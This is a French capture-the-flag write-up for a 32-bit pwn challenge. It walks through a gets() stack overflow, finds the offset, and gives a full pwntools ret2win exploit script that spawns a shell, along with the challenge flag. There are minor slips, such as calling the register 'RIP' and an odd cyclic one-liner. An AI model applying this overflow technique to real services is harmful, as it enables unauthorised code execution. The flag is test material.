# Writeup — Gatehouse

**Category:** Pwn  
**Binary:** `gatehouse` (ELF 32-bit, pas de canary, NX activé)  
**Flag:** `CCOI26{_G00d_J0B_Y0U_bROk3_G4tE_h0USE_}`

---

## Description

> You shall not pass... unless you can break the gate.

---

## Analyse du binaire

```
$ checksec gatehouse
Arch:     i386-32-little
RELRO:    Partial
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

Pas de canary, pas de PIE. L'exécutable est lié avec `libc`. En désassemblant `main` dans Ghidra :

```c
void read_name(void) {
    char buf[64];
    printf("Enter your name: ");
    gets(buf);          // <-- BOF classique
}
```

`gets()` sans limite + pas de canary = buffer overflow direct vers RIP.

---

## Trouver l'offset

Avec un pattern de De Bruijn :

```
$ python3 -c "import cyclic; print(cyclic.cyclic(100))"
```

Je lance dans GDB et je lis EIP au crash → offset = **76 octets**.

---

## Stratégie — ret2plt / ret2win

Il y a une fonction `win()` dans le binaire :

```c
void win(void) {
    system("/bin/sh");
}
```

Pas besoin de ROP complexe. Je saute directement dessus.

```python
payload = b"A" * 76 + p32(win_addr)
```

L'adresse de `win` est fixe (pas de PIE) : `0x080491b6`.

---

## Exploit

```python
from pwn import *

elf = ELF("./gatehouse")
p   = process("./gatehouse")

win = elf.symbols["win"]
payload = b"A" * 76 + p32(win)

p.recvuntil(b"name: ")
p.sendline(payload)
p.interactive()
```

---

## Flag

```
CCOI26{_G00d_J0B_Y0U_bROk3_G4tE_h0USE_}
```
